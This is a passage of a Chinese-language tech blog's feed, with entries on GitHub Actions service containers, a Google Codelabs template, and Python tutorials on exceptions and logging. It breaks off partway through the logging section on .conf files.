href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions Advent Calendar 系列文章 - Index
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第20天：容器服务</title>
    <link href="https://qiwihui.com/qiwihui-blog-103/"/>
    <id>https://qiwihui.com/qiwihui-blog-103/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>很难低估容器在DevOps实践中的重要性。通常，你会将容器部署到生产环境中──因此很自然地开始使用容器进行本地开发，并管理依赖项。我们研究了如何利用它<a href="https://qiwihui.com/qiwihui-blog-88/">在容器内部</a>进行构建。但是，我们也可以使用<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idservices">容器服务</a>，将正在运行的容器用作构建和测试工作流程的一部分。</p><p>你通常需要运行一些与其他服务（通常是数据库）进行通信的集成测试。你可以通过编写 <code>docker run</code> 命令来拉下容器，启动容器并映射必要的端口，从而编写脚本，但这在最佳情况下很烦人。而且，如果你要<a href="https://qiwihui.com/qiwihui-blog-88/">在容器中进行构建</a>，则自己运行docker会变得非常棘手。</p><p>使用容器服务可以使GitHub Actions基础架构为你执行。你只需指定容器和要映射的任何端口，它将在作业开始时启动服务容器，并使该容器可用于作业中的步骤。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&#x27;redis:latest&#x27;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6379</span><span class="string">/tcp</span></span><br></pre></td></tr></table></figure><p>这将启动 <code>redis:latest</code> 容器并将容器中的端口6379映射到虚拟机运行程序上的端口。这等同于运行 <code>docker run redis:latest -p 6379/tcp</code>，就像你要运行该命令一样，映射到本地运行程序上的端口不是确定性的。GitHub Actions可在job.services上下文中提供此信息。</p><p>你可以查看 <code>$&#123;&#123; job.services.redis.ports[6379] &#125;&#125;</code> 以标识本地端口号。（就像运行 <code>docker run</code> 一样，你还可以指定容器端口和本地端口，例如 <code>6379:6379</code>，将容器端口6379映射到本地端口6379。）</p><p>将其放入工作流中，如果我有一个 与Redis对话的 <a href="https://github.com/actions/example-services/tree/master/redis">Node 脚本</a>，并连接到 <code>REDIS_HOST</code> 环境变量所指定的Redis主机的 `REDIS_PORT 端口，那么我可以创建一个工作流，该工作流启动Redis容器并运行Node脚本。</p><script src="https://gist.github.com/ethomson/466de42a3066a4fa646240f5fa20293b.js"></script><p>你可以使用服务容器来启动服务，例如 Redis， PostgreSQL 或MySQL甚至是Selenium。服务容器的执行使工作流中的这些容器的执行和交互变得更加容易。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_20_container_services.html">https://www.edwardthomson.com/blog/github_actions_20_container_services.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第20天：容器服务
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Google codelabs 模板</title>
    <link href="https://qiwihui.com/qiwihui-blog-112/"/>
    <id>https://qiwihui.com/qiwihui-blog-112/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/qiwihui/codelabs-site-template">https://github.com/qiwihui/codelabs-site-template</a></p><p>之前用过 Google Codelabs，对于它提供的指导性，动手的编码过程非常喜欢。Codelabs 用步骤性的教学方式，一步步地引导，非常适合用来书写教程。但是这种教程的编写需要两个过程：一是需要使用特定的格式书写，这个格式比 markdown 稍多一些内容；二是需要使用特定的工具 claat 进行转换。</p><p>这个项目的作用就是提供模板和自动化过程，使用 github actions 完成自动构建和部署过程，是教程书写专注于内容。你所需要做的就是在这个项目模板的基础上，在 <code>markdowns</code> 目录中，按不同需要增加教程即可。</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/108469275-ea983e80-72c2-11eb-8fd6-4d0f8aadf703.png" alt="image"></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Google codelabs 模板
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>09. 异常和错误 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-126/"/>
    <id>https://qiwihui.com/qiwihui-blog-126/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>Python程序在遇到错误后立即终止。在Python中，错误可以是语法错误或异常。 在本文中，我们将关注以下内容：</p><ul><li>语法错误与异常</li><li>如何抛出异常</li><li>如何处理异常</li><li>常见的内置异常</li><li>如何定义自己的异常</li></ul><span id="more"></span><h3><span id="yu-fa-cuo-wu">语法错误</span></h3><p>当解析器检测到语法不正确的语句时发生语法错误。 语法错误可以是例如拼写错误，缺少括号，没有新行（请参见下面的代码）或错误的标识（这实际上会引发它自己的IndentationError，但它是SyntaxError的子类）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span> <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">File <span class="string">&quot;&lt;ipython-input-5-fed4b61d14cd&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">a = <span class="number">5</span> <span class="built_in">print</span>(a)</span><br><span class="line">              ^</span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure><h3><span id="yi-chang">异常</span></h3><p>即使一条语句在语法上是正确的，执行该语句也可能导致错误，这称为 <strong>异常错误</strong>。 有几种不同的错误类别，例如，尝试对数字和字符串求和将引发 <code>TypeError</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span> + <span class="string">&#x27;10&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">6</span>-893398416ed7&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> a = <span class="number">5</span> + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;int&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="pao-chu-yi-chang">抛出异常</span></h3><p>如果要在满足特定条件时强制发生异常，则可以使用 <code>raise</code> 关键字。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;x should not be negative.&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">Exception                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">4</span>-2a9e7e673803&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">      <span class="number">1</span> x = -<span class="number">5</span></span><br><span class="line">      <span class="number">2</span> <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">----&gt; <span class="number">3</span>     <span class="keyword">raise</span> Exception(<span class="string">&#x27;x should not be negative.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Exception: x should <span class="keyword">not</span> be negative.</span><br></pre></td></tr></table></figure><p>你还可以使用 <code>assert</code> 语句，如果你的断言<strong>不是</strong> <code>True</code>，则将引发 <code>AssertionError</code>。 这样，你可以主动测试必须满足的某些条件，而不必等待程序中途崩溃。 断言还用于<strong>单元测试</strong>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> (x &gt;= <span class="number">0</span>), <span class="string">&#x27;x is not positive.&#x27;</span></span><br><span class="line"><span class="comment"># --&gt; 如果 x &gt;= 0，代码将正常运行</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AssertionError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">7</span>-f9b059c51e45&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">      <span class="number">1</span> x = -<span class="number">5</span></span><br><span class="line">----&gt; <span class="number">2</span> <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>), <span class="string">&#x27;x is not positive.&#x27;</span></span><br><span class="line">      <span class="number">3</span> <span class="comment"># --&gt; Your code will be fine if x &gt;= 0</span></span><br><span class="line">AssertionError: x <span class="keyword">is</span> <span class="keyword">not</span> positive.</span><br></pre></td></tr></table></figure><h3><span id="chu-li-yi-chang">处理异常</span></h3><p>你可以使用 <code>try</code> 和 <code>except</code> 块来捕获和处理异常。 如果你可以捕获异常，则你的程序将不会终止，并且可以继续。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这将捕获所有可能的异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;some error occured.&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 可以捕获异常类型</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 最好指定要捕获的异常类型</span></span><br><span class="line"><span class="comment"># 因此，你必须知道可能的错误</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Only a ZeroDivisionError is handled here&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 你可以在try块中运行多个语句，并捕获不同的可能的异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span> <span class="comment"># 注意：这里没有 ZeroDivisionError</span></span><br><span class="line">    b = a + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A TypeError occured:&#x27;</span>, e)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Some error occured.</span><br><span class="line">Division by zero</span><br><span class="line">Only a ZeroDivisionError <span class="keyword">is</span> handled here</span><br><span class="line">A TypeError occured: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;float&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="else-yu-ju"><code>else</code> 语句</span></h3><p>如果没有发生异常，则可以使用else语句运行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Everything is ok&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Everything <span class="keyword">is</span> ok</span><br></pre></td></tr></table></figure><h3><span id="finally-yu-ju"><code>finally</code> 语句</span></h3><p>你可以使用始终运行的 <code>finally</code> 语句，无论是否存在异常。 例如，这可用于进行一些清理操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span> <span class="comment"># 注意：这里没有 ZeroDivisionError</span></span><br><span class="line">    b = a + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A TypeError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Everything is ok&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Cleaning up some stuff...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A TypeError occured: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;float&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br><span class="line">Cleaning up some stuff...</span><br></pre></td></tr></table></figure><h3><span id="chang-jian-de-nei-zhi-yi-chang">常见的内置异常</span></h3><p>你可以在此处找到所有内置的异常：<a href="https://docs.python.org/3/library/exceptions.html">https://docs.python.org/3/library/exceptions.html</a></p><ul><li><code>ImportError</code>：如果无法导入模块</li><li><code>NameError</code>：如果你尝试使用未定义的变量</li><li><code>FileNotFoundError</code>：如果你尝试打开一个不存在的文件或指定了错误的路径</li><li><code>ValueError</code>：当某个操作或函数收到类型正确但值不正确的参数时，例如尝试从不存在的列表中删除值</li><li><code>TypeError</code>：将操作或函数应用于不适当类型的对象时引发。</li><li><code>IndexError</code>：如果你尝试访问序列的无效索引，例如列表或元组。</li><li><code>KeyError</code>：如果你尝试访问字典中不存在的键。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ImportError</span></span><br><span class="line"><span class="keyword">import</span> nonexistingmodule</span><br><span class="line"></span><br><span class="line"><span class="comment"># NameError</span></span><br><span class="line">a = someundefinedvariable</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileNotFoundError</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nonexistingfile.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    read_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ValueError</span></span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">a.remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TypeError</span></span><br><span class="line">a = <span class="number">5</span> + <span class="string">&quot;10&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IndexError</span></span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">value = a[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyError</span></span><br><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Boston&quot;</span>&#125;</span><br><span class="line">age = my_dict[<span class="string">&quot;age&quot;</span>]</span><br></pre></td></tr></table></figure><h3><span id="ru-he-ding-yi-zi-ji-de-yi-chang">如何定义自己的异常</span></h3><p>你可以定义自己的异常类，该异常类应从内置的 <code>Exception</code> 类派生。 与标准异常的命名类似，大多数异常都以“错误”结尾的名称定义。 可以像定义其他任何类一样定义异常类，但是它们通常保持简单，通常仅提供一定数量的属性，这些属性允许处理程序提取有关错误的信息。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义异常类的最小示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTooHighError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者为处理者添加一些信息</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTooLowError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message, value</span>):</span><br><span class="line">        self.message = message</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_value</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueTooHighError(<span class="string">&#x27;Value is too high.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueTooLowError(<span class="string">&#x27;Value is too low.&#x27;</span>, a) <span class="comment"># 注意，构造器接受两个参数</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    test_value(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> ValueTooHighError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ValueTooLowError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e.message, <span class="string">&#x27;The value is:&#x27;</span>, e.value)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value <span class="keyword">is</span> too low. The value <span class="keyword">is</span>: <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      09. 异常和错误 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>10. 日志记录 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-137/"/>
    <id>https://qiwihui.com/qiwihui-blog-137/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Python中的日志记录模块是功能强大的内置模块，因此你可以快速将日志记录添加到应用程序中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br></pre></td></tr></table></figure><span id="more"></span><h2><span id="ri-zhi-ji-bie">日志级别</span></h2><p>有5种不同的日志级别指示事件的严重程度。 默认情况下，系统仅记录 <em>警告(WARNING)</em> 级别及更高级别的事件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.debug(<span class="string">&#x27;This is a debug message&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">&#x27;This is an info message&#x27;</span>)</span><br><span class="line">logging.warning(<span class="string">&#x27;This is a warning message&#x27;</span>)</span><br><span class="line">logging.error(<span class="string">&#x27;This is an error message&#x27;</span>)</span><br><span class="line">logging.critical(<span class="string">&#x27;This is a critical message&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WARNING:root:This <span class="keyword">is</span> a warning message</span><br><span class="line">ERROR:root:This <span class="keyword">is</span> an error message</span><br><span class="line">CRITICAL:root:This <span class="keyword">is</span> a critical message</span><br></pre></td></tr></table></figure><h2><span id="pei-zhi">配置</span></h2><p>使用 <code>basicConfig(**kwargs)</code>，你可以自定义根记录器。 最常见的参数是 <code>level</code>， <code>format</code> 和 <code>filename</code>。查看全部可能的参数：<a href="https://docs.python.org/3/library/logging.html#logging.basicConfig">https://docs.python.org/3/library/logging.html#logging.basicConfig</a>。查看可能的 format ：<a href="https://docs.python.org/3/library/logging.html#logrecord-attributes">https://docs.python.org/3/library/logging.html#logrecord-attributes</a>。查看如何设置时间字符串：<a href="https://docs.python.org/3/library/time.html#time.strftime">https://docs.python.org/3/library/time.html#time.strftime</a>。请注意，此函数仅应调用一次，通常在导入模块后首先调用。 如果根记录器已经配置了处理程序，则该设置无效。 例如，在 <code>basicConfig</code> 之前调用 <code>logging.info(...)</code> 将提前设置处理程序。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>, datefmt=<span class="string">&#x27;%m/%d/%Y %H:%M:%S&#x27;</span>)</span><br><span class="line"><span class="comment"># 现在，调试消息也将以其他格式记录。</span></span><br><span class="line">logging.debug(<span class="string">&#x27;Debug message&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这将记录到文件而不是控制台。</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG, filename=&#x27;app.log&#x27;)</span></span><br></pre></td></tr></table></figure><h2><span id="mo-kuai-nei-ji-lu-he-ji-lu-qi-ceng-ci-jie-gou">模块内记录和记录器层次结构</span></h2><p>在具有多个模块的应用程序中，最佳实践是使用 <code>__name__</code> 全局变量创建内部记录器。 这将使用你的模块名称创建一个记录器，并确保没有名称冲突。 日志记录模块创建记录器的层次结构，从根记录器开始，然后将新的记录器添加到该层次结构中。 如果随后将模块导入另一个模块，则可以通过记录器名称将日志消息与正确的模块关联。 请注意，更改根记录器的 <code>basicConfig</code> 还将影响层次结构中其他（下部）记录器的日志事件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># helper.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.info(<span class="string">&#x27;HELLO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> helper</span><br><span class="line"></span><br><span class="line"><span class="comment"># --&gt; 当运行 main.py 时的输出</span></span><br><span class="line"><span class="comment"># helper - INFO - HELLO</span></span><br></pre></td></tr></table></figure><h2><span id="chuan-bo">传播</span></h2><p>默认情况下，除了附加到创建的记录器的任何处理程序外，所有创建的记录器还将日志事件传递给高级记录器的处理程序。 你可以通过设置 <code>propagate = False</code> 来禁用此功能。 有时，当你想知道为什么看不到来自另一个模块的日志消息时，则可能是此属性。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.propagate = <span class="literal">False</span></span><br><span class="line">logger.info(<span class="string">&#x27;HELLO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> helper</span><br><span class="line"></span><br><span class="line"><span class="comment"># --&gt; 运行main.py时无输出，因为 helper 模块记录器不会将其消息传播到根记录器</span></span><br></pre></td></tr></table></figure><h2><span id="ri-zhi-chu-li-cheng-xu">日志处理程序</span></h2><p>处理程序对象负责将适当的日志消息调度到处理程序的特定目标。 例如，你可以使用不同的处理程序通过HTTP或通过电子邮件将消息发送到标准输出流，文件。 通常，你为每个处理程序配置一个级别（ <code>setLevel()</code> ），一个格式化程序（ <code>setFormatter()</code>）和一个可选的过滤器（ <code>addFilter()</code> ）。 有关可能的内置处理程序，请参见 <a href="https://docs.python.org/3/howto/logging.html#useful-handlers">https://docs.python.org/3/howto/logging.html#useful-handlers</a>。 当然，你也可以通过派生这些类来实现自己的处理程序。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建处理器</span></span><br><span class="line">stream_handler = logging.StreamHandler()</span><br><span class="line">file_handler = logging.FileHandler(<span class="string">&#x27;file.log&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置级别和格式化程序，并添加到处理器上</span></span><br><span class="line">stream_handler.setLevel(logging.WARNING) <span class="comment"># 警告及以上级别日志记录到流中</span></span><br><span class="line">file_handler.setLevel(logging.ERROR) <span class="comment"># 错误及以上级别记录到文件中</span></span><br><span class="line"></span><br><span class="line">stream_format = logging.Formatter(<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_format = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">stream_handler.setFormatter(stream_format)</span><br><span class="line">file_handler.setFormatter(file_format)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加处理器到日志记录器上</span></span><br><span class="line">logger.addHandler(stream_handler)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line">logger.warning(<span class="string">&#x27;This is a warning&#x27;</span>) <span class="comment"># 记录到流中</span></span><br><span class="line">logger.error(<span class="string">&#x27;This is an error&#x27;</span>) <span class="comment"># 记录到流和文件中</span></span><br></pre></td></tr></table></figure><h3><span id="guo-lu-qi-li-zi">过滤器例子</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">InfoFilter</span>(logging.Filter):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 覆盖此方法。 仅此方评估为True的日志记录将通过过滤器。</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">self, record</span>):</span><br><span class="line">        <span class="keyword">return</span> record.levelno == logging.INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在只有 INFO 级别的消息会被记录。</span></span><br><span class="line">stream_handler.addFilter(InfoFilter())</span><br><span class="line">logger.addHandler(stream_handler)</span><br></pre></td></tr></table></figure><h2><span id="qi-ta-pei-zhi-fang-fa">其他配置方法</span></h2><p>我们已经看到了如何配置日志，从而在代码中显式地创建日志记录器，处理程序和格式化程序。 还有其他两种配置方法：</p><ul><li>创建日志记录配置文件并使用 <code>fileConfig()</code> 函数读取它。 请参见下面的示例。</li><li>创建配置信息字典并将其传递给 <code>dictConfig()</code> 函数。 有关更多信息，请参见<a href="https://docs.python.org/3/library/logging.config.html#logging.config.dictConfig">https://docs.python.org/3/library/logging.config.html#logging.config.dictConfig</a>。</li></ul><h3><span id="conf-wen-jian">.conf文件</span></h3><p>创建一个 <em>.conf</em>（或有时存储为 <em>.ini</em>）文件，定义记录器，处理程序和格式化程序，并提供名称作为键。 定义其名称后，可以通过在其名称之间用下划线分隔之前添加单词 <em>logger</em>， <em>handler</em> 和 <em>formatter</em> 进行配置。 